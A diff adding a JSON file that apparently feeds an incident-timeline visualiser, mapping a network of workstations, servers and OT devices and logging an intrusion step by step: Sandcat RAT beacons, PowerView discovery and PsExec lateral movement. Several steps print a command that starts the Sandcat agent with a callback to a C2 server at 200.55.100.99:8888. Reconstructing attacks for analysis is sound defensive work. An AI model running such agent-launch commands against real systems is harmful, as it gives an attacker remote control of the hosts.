@@ -1,0 +1,1315 @@
+{
+  "nodes": [
+    {
+      "id": "node_1781103832634_1",
+      "host": "External Router",
+      "ip": "10.125.160.5",
+      "os": "Vyatta",
+      "icon": "icon-network",
+      "x": "39.32",
+      "y": "25.22"
+    },
+    {
+      "id": "node_1781103832634_2",
+      "host": "Ext Firewall",
+      "ip": "10.125.160.6",
+      "os": "Vyatta",
+      "icon": "icon-firewall",
+      "x": "35.53",
+      "y": "32.29"
+    },
+    {
+      "id": "node_1781103832634_3",
+      "host": "Int Firewall",
+      "ip": "10.125.160.9",
+      "os": "Vyatta",
+      "icon": "icon-firewall",
+      "x": "39.94",
+      "y": "32.38"
+    },
+    {
+      "id": "node_1781103832634_4",
+      "host": "Internal Router",
+      "ip": "10.125.160.10",
+      "os": "Vyatta",
+      "icon": "icon-network",
+      "x": "44.52",
+      "y": "32.44"
+    },
+    {
+      "id": "node_1781103832634_5",
+      "host": "DEVOPS-IT-NET",
+      "ip": "10.125.161.1",
+      "os": "Vyatta",
+      "icon": "icon-network",
+      "x": "40.57",
+      "y": "49.88"
+    },
+    {
+      "id": "node_1781103832634_6",
+      "host": "devops-wks-01",
+      "ip": "10.125.161.51",
+      "os": "Windows 10",
+      "icon": "icon-laptop",
+      "x": "31.97",
+      "y": "58.34"
+    },
+    {
+      "id": "node_1781103832634_7",
+      "host": "devops-wks-02",
+      "ip": "10.125.161.52",
+      "os": "Windows 11",
+      "icon": "icon-laptop",
+      "x": "36.76",
+      "y": "58.52"
+    },
+    {
+      "id": "node_1781103832634_8",
+      "host": "devops-wks-03",
+      "ip": "10.125.161.53",
+      "os": "Windows 7",
+      "icon": "icon-laptop",
+      "x": "41.77",
+      "y": "58.51"
+    },
+    {
+      "id": "node_1781103832634_9",
+      "host": "devops-wks-04",
+      "ip": "10.125.161.54",
+      "os": "Debian",
+      "icon": "icon-laptop",
+      "x": "46.68",
+      "y": "58.43"
+    },
+    {
+      "id": "node_1781103832634_10",
+      "host": "it-wks-01",
+      "ip": "10.125.161.55",
+      "os": "Windows 10",
+      "icon": "icon-laptop",
+      "x": "34.11",
+      "y": "64.20"
+    },
+    {
+      "id": "node_1781103832634_11",
+      "host": "it-wks-02",
+      "ip": "10.125.161.56",
+      "os": "Windows 10",
+      "icon": "icon-laptop",
+      "x": "39.27",
+      "y": "64.31"
+    },
+    {
+      "id": "node_1781103832634_12",
+      "host": "it-wks-03",
+      "ip": "10.125.161.57",
+      "os": "Windows 10",
+      "icon": "icon-laptop",
+      "x": "44.42",
+      "y": "64.41"
+    },
+    {
+      "id": "node_1781103832634_13",
+      "host": "SERVER-NET",
+      "ip": "10.125.163.1",
+      "os": "Vyatta",
+      "icon": "icon-network",
+      "x": "20.42",
+      "y": "50.39"
+    },
+    {
+      "id": "node_1781103832634_14",
+      "host": "exchange",
+      "ip": "10.125.163.20",
+      "os": "Windows 10",
+      "icon": "icon-server",
+      "x": "13.50",
+      "y": "58.52"
+    },
+    {
+      "id": "node_1781103832634_15",
+      "host": "web1",
+      "ip": "10.125.163.21",
+      "os": "Windows 10",
+      "icon": "icon-server",
+      "x": "22.55",
+      "y": "64.38"
+    },
+    {
+      "id": "node_1781103832634_16",
+      "host": "web2",
+      "ip": "10.125.163.22",
+      "os": "Debian",
+      "icon": "icon-server",
+      "x": "18.00",
+      "y": "64.50"
+    },
+    {
+      "id": "node_1781103832634_17",
+      "host": "web3",
+      "ip": "10.125.163.23",
+      "os": "Debian",
+      "icon": "icon-server",
+      "x": "13.42",
+      "y": "64.36"
+    },
+    {
+      "id": "node_1781103832634_18",
+      "host": "mysql",
+      "ip": "10.125.163.26",
+      "os": "Windows 10",
+      "icon": "icon-server",
+      "x": "27.07",
+      "y": "58.32"
+    },
+    {
+      "id": "node_1781103832634_19",
+      "host": "File01",
+      "ip": "10.125.163.27",
+      "os": "Windows 10",
+      "icon": "icon-server",
+      "x": "18.21",
+      "y": "58.50"
+    },
+    {
+      "id": "node_1781103832634_20",
+      "host": "File02",
+      "ip": "10.125.163.28",
+      "os": "Ubuntu",
+      "icon": "icon-server",
+      "x": "22.66",
+      "y": "58.48"
+    },
+    {
+      "id": "node_1781103832634_21",
+      "host": "AD-NET",
+      "ip": "10.125.162.1",
+      "os": "Vyatta",
+      "icon": "icon-network",
+      "x": "58.53",
+      "y": "35.90"
+    },
+    {
+      "id": "node_1781103832634_22",
+      "host": "dc01",
+      "ip": "10.125.162.20",
+      "os": "Windows 10",
+      "icon": "icon-server",
+      "x": "63.37",
+      "y": "35.83"
+    },
+    {
+      "id": "node_1781103832634_23",
+      "host": "dc02",
+      "ip": "10.125.162.21",
+      "os": "Windows 10",
+      "icon": "icon-server",
+      "x": "68.39",
+      "y": "35.80"
+    },
+    {
+      "id": "node_1781103832634_24",
+      "host": "SALES-HR-NET",
+      "ip": "10.125.164.1",
+      "os": "Vyatta",
+      "icon": "icon-network",
+      "x": "55.61",
+      "y": "49.46"
+    },
+    {
+      "id": "node_1781103832634_25",
+      "host": "hr-wks-01",
+      "ip": "10.125.164.51",
+      "os": "Windows 10",
+      "icon": "icon-laptop",
+      "x": "60.85",
+      "y": "53.37"
+    },
+    {
+      "id": "node_1781103832634_26",
+      "host": "hr-wks-02",
+      "ip": "10.125.164.52",
+      "os": "Windows 10",
+      "icon": "icon-laptop",
+      "x": "65.62",
+      "y": "53.22"
+    },
+    {
+      "id": "node_1781103832634_27",
+      "host": "hr-wks-03",
+      "ip": "10.125.164.53",
+      "os": "Windows 7",
+      "icon": "icon-laptop",
+      "x": "70.68",
+      "y": "53.13"
+    },
+    {
+      "id": "node_1781103832634_28",
+      "host": "sales-wks-01",
+      "ip": "10.125.164.54",
+      "os": "Windows 10",
+      "icon": "icon-laptop",
+      "x": "60.69",
+      "y": "46.17"
+    },
+    {
+      "id": "node_1781103832634_29",
+      "host": "sales-wks-02",
+      "ip": "10.125.164.55",
+      "os": "Windows 10",
+      "icon": "icon-laptop",
+      "x": "65.35",
+      "y": "45.96"
+    },
+    {
+      "id": "node_1781103832634_30",
+      "host": "sales-wks-03",
+      "ip": "10.125.164.56",
+      "os": "Windows 11",
+      "icon": "icon-laptop",
+      "x": "70.56",
+      "y": "45.76"
+    },
+    {
+      "id": "node_1781103832634_31",
+      "host": "DMZ-Router",
+      "ip": "10.125.168.1",
+      "os": "Vyatta",
+      "icon": "icon-network",
+      "x": "21.25",
+      "y": "33.14"
+    },
+    {
+      "id": "node_1781103832634_32",
+      "host": "extdns",
+      "ip": "10.125.168.20",
+      "os": "Windows 10",
+      "icon": "icon-server",
+      "x": "23.52",
+      "y": "39.82"
+    },
+    {
+      "id": "node_1781103832634_33",
+      "host": "www",
+      "ip": "10.125.168.21",
+      "os": "Windows 10",
+      "icon": "icon-server",
+      "x": "18.19",
+      "y": "39.81"
+    },
+    {
+      "id": "node_1781103832634_34",
+      "host": "OT-NET",
+      "ip": "192.168.0.1",
+      "os": "Vyatta",
+      "icon": "icon-network",
+      "x": "54.93",
+      "y": "58.23"
+    },
+    {
+      "id": "node_1781103832634_35",
+      "host": "PI",
+      "ip": "192.168.0.21",
+      "os": "Raspberry Pi OS",
+      "icon": "icon-hmi",
+      "x": "52.59",
+      "y": "64.63"
+    },
+    {
+      "id": "node_1781103832634_36",
+      "host": "ICS-PLC",
+      "ip": "192.168.0.26",
+      "os": "Click",
+      "icon": "icon-plc",
+      "x": "57.20",
+      "y": "64.82"
+    },
+    {
+      "id": "node_1781103832634_37",
+      "host": "syslog",
+      "ip": "10.125.163.29",
+      "os": "Windows 10",
+      "icon": "icon-server",
+      "x": "27.07",
+      "y": "64.20",
+      "notes": "",
+      "other_ips": [],
+      "cves": []
+    },
+    {
+      "host": "Malicious IP",
+      "ip": "200.55.100.99",
+      "os": "",
+      "icon": "icon-cloud",
+      "x": "28.65",
+      "y": "24.63",
+      "id": "node_1781106366501",
+      "notes": "",
+      "other_ips": [],
+      "cves": []
+    }
+  ],
+  "steps": [
+    {
+      "id": "1783274652392",
+      "title": "Sandcat RAT",
+      "date": "2026-06-19",
+      "time": "14:17:03",
+      "tactic": "Initial Access",
+      "action": "T1059.003, T1071.001",
+      "desc": "C:\\Users\\Public\\service.exe",
+      "raw": "",
+      "nodes": [
+        "node_1781103832634_26",
+        "node_1781106366501"
+      ],
+      "type": "remote_action",
+      "eventType": "Network",
+      "eventData": {
+        "SrcIP": "10.125.164.52",
+        "DstIP": "200.55.100.99",
+        "Port": "8888",
+        "Protocol": "HTTP",
+        "ProcName": "service.exe",
+        "ProcID": ""
+      }
+    },
+    {
+      "id": "1783214877632",
+      "title": " Remote System Discovery",
+      "date": "2026-06-19",
+      "time": "15:20:15",
+      "tactic": "Discovery",
+      "action": "T1018",
+      "desc": "amsi:_C:\\Windows\\System32\\powerview.ps1\nHackTool:PowerShell/PowerView.A",
+      "raw": "1116",
+      "nodes": [
+        "node_1781106366501",
+        "node_1781103832634_26"
+      ],
+      "type": "remote_action",
+      "eventType": "Network",
+      "eventData": {
+        "SrcIP": " 200.55.100.99",
+        "DstIP": " 10.125.164.52",
+        "Port": "",
+        "Protocol": "",
+        "ProcName": "powershell.exe",
+        "ProcID": ""
+      }
+    },
+    {
+      "id": "1783347920541",
+      "title": " Lateral Movement",
+      "date": "2026-06-19",
+      "time": "15:21:47",
+      "tactic": "Lateral Movement",
+      "action": "T1021.002, T1569.002, T1550.003",
+      "desc": "",
+      "raw": "",
+      "nodes": [
+        "node_1781103832634_26",
+        "node_1781103832634_37"
+      ],
+      "type": "remote_action",
+      "eventType": "Network",
+      "eventData": {
+        "SrcIP": " 10.125.164.52",
+        "DstIP": "10.125.163.29",
+        "Port": "",
+        "Protocol": "",
+        "ProcName": " PsExec.exe",
+        "ProcID": ""
+      }
+    },
+    {
+      "id": "1783348044380",
+      "title": "Sandcat RAT",
+      "date": "2026-06-19",
+      "time": "15:21:47",
+      "tactic": "Execution",
+      "action": "T1059.003, T1071.001",
+      "desc": "cmd /c start C:\\Windows\\Temp\\sandcat.go-windows -server http://200.55.100.99:8888 -v",
+      "raw": "",
+      "nodes": [
+        "node_1781103832634_37",
+        "node_1781106366501"
+      ],
+      "type": "remote_action",
+      "eventType": "Network",
+      "eventData": {
+        "SrcIP": " 10.125.163.29",
+        "DstIP": "200.55.100.99",
+        "Port": "8888",
+        "Protocol": "HTTP",
+        "ProcName": "sandcat.go-windows",
+        "ProcID": ""
+      }
+    },
+    {
+      "id": "1783102496240",
+      "title": " Lateral Movement",
+      "date": "2026-06-19",
+      "time": "15:22:51",
+      "tactic": "Lateral Movement",
+      "action": "T1021.002, T1569.002, T1550.003",
+      "desc": "",
+      "raw": "",
+      "nodes": [
+        "node_1781103832634_26",
+        "node_1781103832634_14"
+      ],
+      "type": "remote_action",
+      "eventType": "Network",
+      "eventData": {
+        "SrcIP": " 10.125.164.52",
+        "DstIP": "10.125.163.20",
+        "Port": "",
+        "Protocol": "",
+        "ProcName": " PsExec.exe",
+        "ProcID": ""
+      }
+    },
+    {
+      "id": "1783191778793",
+      "title": "Sandcat RAT",
+      "date": "2026-06-19",
+      "time": "15:22:51",
+      "tactic": "Execution",
+      "action": "T1059.003, T1071.001",
+      "desc": "cmd /c start C:\\Windows\\Temp\\sandcat.go-windows -server http://200.55.100.99:8888 -v",
+      "raw": "",
+      "nodes": [
+        "node_1781103832634_14",
+        "node_1781106366501"
+      ],
+      "type": "remote_action",
+      "eventType": "Network",
+      "eventData": {
+        "SrcIP": " 10.125.163.20",
+        "DstIP": "200.55.100.99",
+        "Port": "8888",
+        "Protocol": "HTTP",
+        "ProcName": "sandcat.go-windows",
+        "ProcID": ""
+      }
+    },
+    {
+      "id": "1783106160112",
+      "title": " Lateral Movement",
+      "date": "2026-06-19",
+      "time": "15:23:32",
+      "tactic": "Lateral Movement",
+      "action": "T1021.002, T1569.002, T1550.003",
+      "desc": "",
+      "raw": "",
+      "nodes": [
+        "node_1781103832634_26",
+        "node_1781103832634_25"
+      ],
+      "type": "remote_action",
+      "eventType": "Network",
+      "eventData": {
+        "SrcIP": " 10.125.164.52",
+        "DstIP": "10.125.164.51",
+        "Port": "",
+        "Protocol": "",
+        "ProcName": " PsExec.exe",
+        "ProcID": ""
+      }
+    },
+    {
+      "id": "1783199882297",
+      "title": "Sandcat RAT",
+      "date": "2026-06-19",
+      "time": "15:23:32",
+      "tactic": "Execution",
+      "action": "T1059.003, T1071.001",
+      "desc": "cmd /c start C:\\Windows\\Temp\\sandcat.go-windows -server http://200.55.100.99:8888 -v",
+      "raw": "",
+      "nodes": [
+        "node_1781103832634_25",
+        "node_1781106366501"
+      ],
+      "type": "remote_action",
+      "eventType": "Network",
+      "eventData": {
+        "SrcIP": "10.125.164.51",
+        "DstIP": "200.55.100.99",
+        "Port": "8888",
+        "Protocol": "HTTP",
+        "ProcName": "sandcat.go-windows",
+        "ProcID": ""
+      }
+    },
+    {
+      "id": "1783106350553",
+      "title": " Lateral Movement",
+      "date": "2026-06-19",
+      "time": "15:24:34",
+      "tactic": "Lateral Movement",
+      "action": "T1021.002, T1569.002, T1550.003",
+      "desc": "",
+      "raw": "",
+      "nodes": [
+        "node_1781103832634_26",
+        "node_1781103832634_27"
+      ],
+      "type": "remote_action",
+      "eventType": "Network",
+      "eventData": {
+        "SrcIP": " 10.125.164.52",
+        "DstIP": "10.125.164.53",
+        "Port": "",
+        "Protocol": "",
+        "ProcName": " PsExec.exe",
+        "ProcID": ""
+      }
+    },
+    {
+      "id": "1783199942692",
+      "title": "Sandcat RAT",
+      "date": "2026-06-19",
+      "time": "15:24:34",
+      "tactic": "Execution",
+      "action": "T1059.003, T1071.001",
+      "desc": "cmd /c start C:\\Windows\\Temp\\sandcat.go-windows -server http://200.55.100.99:8888 -v",
+      "raw": "",
+      "nodes": [
+        "node_1781103832634_27",
+        "node_1781106366501"
+      ],
+      "type": "remote_action",
+      "eventType": "Network",
+      "eventData": {
+        "SrcIP": "10.125.164.53",
+        "DstIP": "200.55.100.99",
+        "Port": "8888",
+        "Protocol": "HTTP",
+        "ProcName": "sandcat.go-windows",
+        "ProcID": ""
+      }
+    },
+    {
+      "id": "1783199984535",
+      "title": "Sandcat RAT",
+      "date": "2026-06-19",
+      "time": "15:25:19",
+      "tactic": "Execution",
+      "action": "T1059.003, T1071.001",
+      "desc": "cmd /c start C:\\Windows\\Temp\\sandcat.go-windows -server http://200.55.100.99:8888 -v",
+      "raw": "",
+      "nodes": [
+        "node_1781103832634_26",
+        "node_1781106366501"
+      ],
+      "type": "remote_action",
+      "eventType": "Network",
+      "eventData": {
+        "SrcIP": "10.125.164.52",
+        "DstIP": "200.55.100.99",
+        "Port": "8888",
+        "Protocol": "HTTP",
+        "ProcName": "sandcat.go-windows",
+        "ProcID": ""
+      }
+    },
+    {
+      "id": "1783214908731",
+      "title": " Remote System Discovery",
+      "date": "2026-06-19",
+      "time": "15:26:27",
+      "tactic": "Discovery",
+      "action": "T1018",
+      "desc": "amsi:_C:\\Windows\\System32\\powerview.ps1\nHackTool:PowerShell/PowerView.A",
+      "raw": "1116",
+      "nodes": [
+        "node_1781106366501",
+        "node_1781103832634_25"
+      ],
+      "type": "remote_action",
+      "eventType": "Network",
+      "eventData": {
+        "SrcIP": " 200.55.100.99",
+        "DstIP": "10.125.164.51",
+        "Port": "",
+        "Protocol": "",
+        "ProcName": "powershell.exe",
+        "ProcID": ""
+      }
+    },
+    {
+      "id": "1783106482713",
+      "title": " Lateral Movement",
+      "date": "2026-06-19",
+      "time": "15:28:07",
+      "tactic": "Lateral Movement",
+      "action": "T1021.002, T1569.002, T1550.003",
+      "desc": "",
+      "raw": "",
+      "nodes": [
+        "node_1781103832634_26",
+        "node_1781103832634_10"
+      ],
+      "type": "remote_action",
+      "eventType": "Network",
+      "eventData": {
+        "SrcIP": " 10.125.164.52",
+        "DstIP": "10.125.161.55",
+        "Port": "",
+        "Protocol": "",
+        "ProcName": " PsExec.exe",
+        "ProcID": ""
+      }
+    },
+    {
+      "id": "1783200019353",
+      "title": "Sandcat RAT",
+      "date": "2026-06-19",
+      "time": "15:28:07",
+      "tactic": "Execution",
+      "action": "T1059.003, T1071.001",
+      "desc": "cmd /c start C:\\Windows\\Temp\\sandcat.go-windows -server http://200.55.100.99:8888 -v",
+      "raw": "",
+      "nodes": [
+        "node_1781103832634_10",
+        "node_1781106366501"
+      ],
+      "type": "remote_action",
+      "eventType": "Network",
+      "eventData": {
+        "SrcIP": "10.125.161.55",
+        "DstIP": "200.55.100.99",
+        "Port": "8888",
+        "Protocol": "HTTP",
+        "ProcName": "sandcat.go-windows",
+        "ProcID": ""
+      }
+    },
+    {
+      "id": "1783106663939",
+      "title": " Lateral Movement",
+      "date": "2026-06-19",
+      "time": "15:29:58",
+      "tactic": "Lateral Movement",
+      "action": "T1021.002, T1569.002, T1550.003",
+      "desc": "",
+      "raw": "",
+      "nodes": [
+        "node_1781103832634_26",
+        "node_1781103832634_19"
+      ],
+      "type": "remote_action",
+      "eventType": "Network",
+      "eventData": {
+        "SrcIP": " 10.125.164.52",
+        "DstIP": "10.125.163.27",
+        "Port": "",
+        "Protocol": "",
+        "ProcName": " PsExec.exe",
+        "ProcID": ""
+      }
+    },
+    {
+      "id": "1783200097218",
+      "title": "Sandcat RAT",
+      "date": "2026-06-19",
+      "time": "15:29:58",
+      "tactic": "Execution",
+      "action": "T1059.003, T1071.001",
+      "desc": "cmd /c start C:\\Windows\\Temp\\sandcat.go-windows -server http://200.55.100.99:8888 -v",
+      "raw": "",
+      "nodes": [
+        "node_1781103832634_19",
+        "node_1781106366501"
+      ],
+      "type": "remote_action",
+      "eventType": "Network",
+      "eventData": {
+        "SrcIP": "10.125.163.27",
+        "DstIP": "200.55.100.99",
+        "Port": "8888",
+        "Protocol": "HTTP",
+        "ProcName": "sandcat.go-windows",
+        "ProcID": ""
+      }
+    },
+    {
+      "id": "1783106696594",
+      "title": " Lateral Movement",
+      "date": "2026-06-19",
+      "time": "15:31:02",
+      "tactic": "Lateral Movement",
+      "action": "T1021.002, T1569.002, T1550.003",
+      "desc": "",
+      "raw": "",
+      "nodes": [
+        "node_1781103832634_26",
+        "node_1781103832634_12"
+      ],
+      "type": "remote_action",
+      "eventType": "Network",
+      "eventData": {
+        "SrcIP": " 10.125.164.52",
+        "DstIP": "10.125.161.57",
+        "Port": "",
+        "Protocol": "",
+        "ProcName": " PsExec.exe",
+        "ProcID": ""
+      }
+    },
+    {
+      "id": "1783200136874",
+      "title": "Sandcat RAT",
+      "date": "2026-06-19",
+      "time": "15:31:02",
+      "tactic": "Execution",
+      "action": "T1059.003, T1071.001",
+      "desc": "cmd /c start C:\\Windows\\Temp\\sandcat.go-windows -server http://200.55.100.99:8888 -v",
+      "raw": "",
+      "nodes": [
+        "node_1781103832634_12",
+        "node_1781106366501"
+      ],
+      "type": "remote_action",
+      "eventType": "Network",
+      "eventData": {
+        "SrcIP": "10.125.161.57",
+        "DstIP": "200.55.100.99",
+        "Port": "8888",
+        "Protocol": "HTTP",
+        "ProcName": "sandcat.go-windows",
+        "ProcID": ""
+      }
+    },
+    {
+      "id": "1783214933916",
+      "title": " Remote System Discovery",
+      "date": "2026-06-19",
+      "time": "15:32:42",
+      "tactic": "Discovery",
+      "action": "T1018",
+      "desc": "amsi:_C:\\Windows\\System32\\powerview.ps1\nHackTool:PowerShell/PowerView.A",
+      "raw": "1116",
+      "nodes": [
+        "node_1781106366501",
+        "node_1781103832634_10"
+      ],
+      "type": "remote_action",
+      "eventType": "Network",
+      "eventData": {
+        "SrcIP": " 200.55.100.99",
+        "DstIP": "10.125.161.55",
+        "Port": "",
+        "Protocol": "",
+        "ProcName": "powershell.exe",
+        "ProcID": ""
+      }
+    },
+    {
+      "id": "1783106751311",
+      "title": " Lateral Movement",
+      "date": "2026-06-19",
+      "time": "15:33:39",
+      "tactic": "Lateral Movement",
+      "action": "T1021.002, T1569.002, T1550.003",
+      "desc": "",
+      "raw": "",
+      "nodes": [
+        "node_1781103832634_26",
+        "node_1781103832634_11"
+      ],
+      "type": "remote_action",
+      "eventType": "Network",
+      "eventData": {
+        "SrcIP": " 10.125.164.52",
+        "DstIP": "10.125.161.56",
+        "Port": "",
+        "Protocol": "",
+        "ProcName": " PsExec.exe",
+        "ProcID": ""
+      }
+    },
+    {
+      "id": "1783200162208",
+      "title": "Sandcat RAT",
+      "date": "2026-06-19",
+      "time": "15:33:39",
+      "tactic": "Execution",
+      "action": "T1059.003, T1071.001",
+      "desc": "cmd /c start C:\\Windows\\Temp\\sandcat.go-windows -server http://200.55.100.99:8888 -v",
+      "raw": "",
+      "nodes": [
+        "node_1781103832634_11",
+        "node_1781106366501"
+      ],
+      "type": "remote_action",
+      "eventType": "Network",
+      "eventData": {
+        "SrcIP": "10.125.161.56",
+        "DstIP": "200.55.100.99",
+        "Port": "8888",
+        "Protocol": "HTTP",
+        "ProcName": "sandcat.go-windows",
+        "ProcID": ""
+      }
+    },
+    {
+      "id": "1783106782947",
+      "title": " Lateral Movement",
+      "date": "2026-06-19",
+      "time": "15:34:59",
+      "tactic": "Lateral Movement",
+      "action": "T1021.002, T1569.002, T1550.003",
+      "desc": "",
+      "raw": "",
+      "nodes": [
+        "node_1781103832634_26",
+        "node_1781103832634_8"
+      ],
+      "type": "remote_action",
+      "eventType": "Network",
+      "eventData": {
+        "SrcIP": " 10.125.164.52",
+        "DstIP": "10.125.161.53",
+        "Port": "",
+        "Protocol": "",
+        "ProcName": " PsExec.exe",
+        "ProcID": ""
+      }
+    },
+    {
+      "id": "1783200223568",
+      "title": "Sandcat RAT",
+      "date": "2026-06-19",
+      "time": "15:34:59",
+      "tactic": "Execution",
+      "action": "T1059.003, T1071.001",
+      "desc": "cmd /c start C:\\Windows\\Temp\\sandcat.go-windows -server http://200.55.100.99:8888 -v",
+      "raw": "",
+      "nodes": [
+        "node_1781103832634_8",
+        "node_1781106366501"
+      ],
+      "type": "remote_action",
+      "eventType": "Network",
+      "eventData": {
+        "SrcIP": "10.125.161.53",
+        "DstIP": "200.55.100.99",
+        "Port": "8888",
+        "Protocol": "HTTP",
+        "ProcName": "sandcat.go-windows",
+        "ProcID": ""
+      }
+    },
+    {
+      "id": "1783106843615",
+      "title": " Lateral Movement",
+      "date": "2026-06-19",
+      "time": "15:36:15",
+      "tactic": "Lateral Movement",
+      "action": "T1021.002, T1569.002, T1550.003",
+      "desc": "",
+      "raw": "",
+      "nodes": [
+        "node_1781103832634_26",
+        "node_1781103832634_7"
+      ],
+      "type": "remote_action",
+      "eventType": "Network",
+      "eventData": {
+        "SrcIP": " 10.125.164.52",
+        "DstIP": "10.125.161.52",
+        "Port": "",
+        "Protocol": "",
+        "ProcName": " PsExec.exe",
+        "ProcID": ""
+      }
+    },
+    {
+      "id": "1783200245503",
+      "title": "Sandcat RAT",
+      "date": "2026-06-19",
+      "time": "15:36:15",
+      "tactic": "Execution",
+      "action": "T1059.003, T1071.001",
+      "desc": "cmd /c start C:\\Windows\\Temp\\sandcat.go-windows -server http://200.55.100.99:8888 -v",
+      "raw": "",
+      "nodes": [
+        "node_1781103832634_7",
+        "node_1781106366501"
+      ],
+      "type": "remote_action",
+      "eventType": "Network",
+      "eventData": {
+        "SrcIP": "10.125.161.52",
+        "DstIP": "200.55.100.99",
+        "Port": "8888",
+        "Protocol": "HTTP",
+        "ProcName": "sandcat.go-windows",
+        "ProcID": ""
+      }
+    },
+    {
+      "id": "1783200328345",
+      "title": "Sandcat RAT",
+      "date": "2026-06-19",
+      "time": "15:38:19",
+      "tactic": "Execution",
+      "action": "T1059.003, T1071.001",
+      "desc": "cmd /c start C:\\Windows\\Temp\\sandcat.go-windows -server http://200.55.100.99:8888 -v",
+      "raw": "",
+      "nodes": [
+        "node_1781103832634_6",
+        "node_1781106366501"
+      ],
+      "type": "remote_action",
+      "eventType": "Network",
+      "eventData": {
+        "SrcIP": "10.125.161.51",
+        "DstIP": "200.55.100.99",
+        "Port": "8888",
+        "Protocol": "HTTP",
+        "ProcName": "sandcat.go-windows",
+        "ProcID": ""
+      }
+    },
+    {
+      "id": "1783106898736",
+      "title": " Lateral Movement",
+      "date": "2026-06-19",
+      "time": "15:38:30",
+      "tactic": "Lateral Movement",
+      "action": "T1021.002, T1569.002, T1550.003",
+      "desc": "",
+      "raw": "",
+      "nodes": [
+        "node_1781103832634_26",
+        "node_1781103832634_6"
+      ],
+      "type": "remote_action",
+      "eventType": "Network",
+      "eventData": {
+        "SrcIP": " 10.125.164.52",
+        "DstIP": "10.125.161.51",
+        "Port": "",
+        "Protocol": "",
+        "ProcName": " PsExec.exe",
+        "ProcID": ""
+      }
+    },
+    {
+      "id": "1783106950021",
+      "title": " Lateral Movement",
+      "date": "2026-06-19",
+      "time": "15:40:04",
+      "tactic": "Lateral Movement",
+      "action": "T1021.002, T1569.002, T1550.003",
+      "desc": "",
+      "raw": "",
+      "nodes": [
+        "node_1781103832634_26",
+        "node_1781103832634_29"
+      ],
+      "type": "remote_action",
+      "eventType": "Network",
+      "eventData": {
+        "SrcIP": " 10.125.164.52",
+        "DstIP": "10.125.164.55",
+        "Port": "",
+        "Protocol": "",
+        "ProcName": " PsExec.exe",
+        "ProcID": ""
+      }
+    },
+    {
+      "id": "1783200473301",
+      "title": "Sandcat RAT",
+      "date": "2026-06-19",
+      "time": "15:42:19",
+      "tactic": "Execution",
+      "action": "T1059.003, T1071.001",
+      "desc": "cmd /c start C:\\Windows\\Temp\\sandcat.go-windows -server http://200.55.100.99:8888 -v",
+      "raw": "",
+      "nodes": [
+        "node_1781103832634_30",
+        "node_1781106366501"
+      ],
+      "type": "remote_action",
+      "eventType": "Network",
+      "eventData": {
+        "SrcIP": "10.125.164.56",
+        "DstIP": "200.55.100.99",
+        "Port": "8888",
+        "Protocol": "HTTP",
+        "ProcName": "sandcat.go-windows",
+        "ProcID": ""
+      }
+    },
+    {
+      "id": "1783106988988",
+      "title": " Lateral Movement",
+      "date": "2026-06-19",
+      "time": "15:42:24",
+      "tactic": "Lateral Movement",
+      "action": "T1021.002, T1569.002, T1550.003",
+      "desc": "",
+      "raw": "",
+      "nodes": [
+        "node_1781103832634_26",
+        "node_1781103832634_30"
+      ],
+      "type": "remote_action",
+      "eventType": "Network",
+      "eventData": {
+        "SrcIP": " 10.125.164.52",
+        "DstIP": "10.125.164.56",
+        "Port": "",
+        "Protocol": "",
+        "ProcName": " PsExec.exe",
+        "ProcID": ""
+      }
+    },
+    {
+      "id": "1783101966973",
+      "title": " Remote System Discovery",
+      "date": "2026-06-19",
+      "time": "15:42:26",
+      "tactic": "Discovery",
+      "action": "T1018",
+      "desc": "amsi:_C:\\Windows\\System32\\powerview.ps1\nHackTool:PowerShell/PowerView.A",
+      "raw": "1116",
+      "nodes": [
+        "node_1781106366501",
+        "node_1781103832634_30"
+      ],
+      "type": "remote_action",
+      "eventType": "Network",
+      "eventData": {
+        "SrcIP": " 200.55.100.99",
+        "DstIP": " 10.125.164.56",
+        "Port": "",
+        "Protocol": "",
+        "ProcName": "powershell.exe",
+        "ProcID": ""
+      }
+    },
+    {
+      "id": "1783214805867",
+      "title": " Remote System Discovery",
+      "date": "2026-06-19",
+      "time": "15:42:26",
+      "tactic": "Discovery",
+      "action": "T1018",
+      "desc": "amsi:_C:\\Windows\\System32\\powerview.ps1\nHackTool:PowerShell/PowerView.A",
+      "raw": "1116",
+      "nodes": [
+        "node_1781106366501",
+        "node_1781103832634_26"
+      ],
+      "type": "remote_action",
+      "eventType": "Network",
+      "eventData": {
+        "SrcIP": " 200.55.100.99",
+        "DstIP": " 10.125.164.52",
+        "Port": "",
+        "Protocol": "",
+        "ProcName": "powershell.exe",
+        "ProcID": ""
+      }
+    },
+    {
+      "id": "1783214839776",
+      "title": " Remote System Discovery",
+      "date": "2026-06-19",
+      "time": "15:42:26",
+      "tactic": "Discovery",
+      "action": "T1018",
+      "desc": "amsi:_C:\\Windows\\System32\\powerview.ps1\nHackTool:PowerShell/PowerView.A",
+      "raw": "1116",
+      "nodes": [
+        "node_1781106366501",
+        "node_1781103832634_26"
+      ],
+      "type": "remote_action",
+      "eventType": "Network",
+      "eventData": {
+        "SrcIP": " 200.55.100.99",
+        "DstIP": " 10.125.164.52",
+        "Port": "",
+        "Protocol": "",
+        "ProcName": "powershell.exe",
+        "ProcID": ""
+      }
+    },
+    {
+      "id": "1783214956736",
+      "title": " Remote System Discovery",
+      "date": "2026-06-19",
+      "time": "15:44:04",
+      "tactic": "Discovery",
+      "action": "T1018",
+      "desc": "amsi:_C:\\Windows\\System32\\powerview.ps1\nHackTool:PowerShell/PowerView.A",
+      "raw": "1116",
+      "nodes": [
+        "node_1781106366501",
+        "node_1781103832634_6"
+      ],
+      "type": "remote_action",
+      "eventType": "Network",
+      "eventData": {
+        "SrcIP": " 200.55.100.99",
+        "DstIP": "10.125.161.51",
+        "Port": "",
+        "Protocol": "",
+        "ProcName": "powershell.exe",
+        "ProcID": ""
+      }
+    },
+    {
+      "id": "1783200495134",
+      "title": "Sandcat RAT",
+      "date": "2026-06-19",
+      "time": "15:44:11",
+      "tactic": "Execution",
+      "action": "T1059.003, T1071.001",
+      "desc": "cmd /c start C:\\Windows\\Temp\\sandcat.go-windows -server http://200.55.100.99:8888 -v",
+      "raw": "",
+      "nodes": [
+        "node_1781103832634_28",
+        "node_1781106366501"
+      ],
+      "type": "remote_action",
+      "eventType": "Network",
+      "eventData": {
+        "SrcIP": "10.125.164.54",
+        "DstIP": "200.55.100.99",
+        "Port": "8888",
+        "Protocol": "HTTP",
+        "ProcName": "sandcat.go-windows",
+        "ProcID": ""
+      }
+    },
+    {
+      "id": "1783107041571",
+      "title": " Lateral Movement",
+      "date": "2026-06-19",
+      "time": "15:44:30",
+      "tactic": "Lateral Movement",
